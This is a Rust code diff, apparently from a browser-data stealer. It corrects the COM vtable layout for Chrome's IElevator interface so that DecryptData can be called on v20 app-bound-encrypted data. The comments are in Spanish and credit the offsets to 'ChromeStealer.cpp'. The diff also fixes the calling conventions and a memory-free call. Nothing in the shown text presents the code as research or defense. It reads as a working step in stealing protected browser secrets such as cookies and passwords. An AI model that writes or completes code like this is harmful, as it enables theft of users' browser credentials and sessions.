@@ -41,24 +41,25 @@ pub struct IElevator {
 #[repr(C)]
 pub struct IElevatorVtbl {
     // IUnknown methods
-    pub QueryInterface: unsafe extern "system" fn(
+    pub QueryInterface: unsafe extern "stdcall" fn(
         This: *mut IElevator,
         riid: REFIID,
         ppvObject: *mut *mut c_void,
     ) -> i32,
-    pub AddRef: unsafe extern "system" fn(This: *mut IElevator) -> u32,
-    pub Release: unsafe extern "system" fn(This: *mut IElevator) -> u32,
+    pub AddRef: unsafe extern "stdcall" fn(This: *mut IElevator) -> u32,
+    pub Release: unsafe extern "stdcall" fn(This: *mut IElevator) -> u32,
 
-    // IElevator methods (agregamos solo DecryptData que necesitamos)
-    // Nota: Hay otros métodos antes de DecryptData que necesitamos contar
-    pub _placeholder1: usize,
-    pub _placeholder2: usize,
-    pub _placeholder3: usize,
-    pub _placeholder4: usize,
-    pub _placeholder5: usize,
-    
-    // DecryptData está en posición ~8-10 dependiendo de la versión
-    pub DecryptData: unsafe extern "system" fn(
+    // Métodos IElevator (offsets exactos de ChromeStealer.cpp)
+    pub placeholder1: usize,
+    pub placeholder2: usize,
+    pub placeholder3: usize,
+    pub placeholder4: usize,
+    pub placeholder5: usize,
+    pub placeholder6: usize,
+    pub placeholder7: usize,
+    pub placeholder8: usize,
+    // DecryptData está en la posición 12 (offset 0x60)
+    pub DecryptData: unsafe extern "stdcall" fn(
         This: *mut IElevator,
         encrypted_data: *const u8,
         encrypted_data_size: u32,
@@ -161,7 +162,7 @@ impl ElevationServiceClient {
             writeln!(debug, "[decrypt_v20] DecryptData SUCCESS, {} bytes", decrypted_size).ok();
             let decrypted_data = std::slice::from_raw_parts(decrypted_ptr, decrypted_size as usize).to_vec();
             // Liberar memoria asignada por COM
-            CoTaskMemFree(decrypted_ptr as *mut c_void);
+            CoTaskMemFree(std::mem::transmute::<*mut u8, *mut winapi::ctypes::c_void>(decrypted_ptr));
             Ok(decrypted_data)
         }
     }
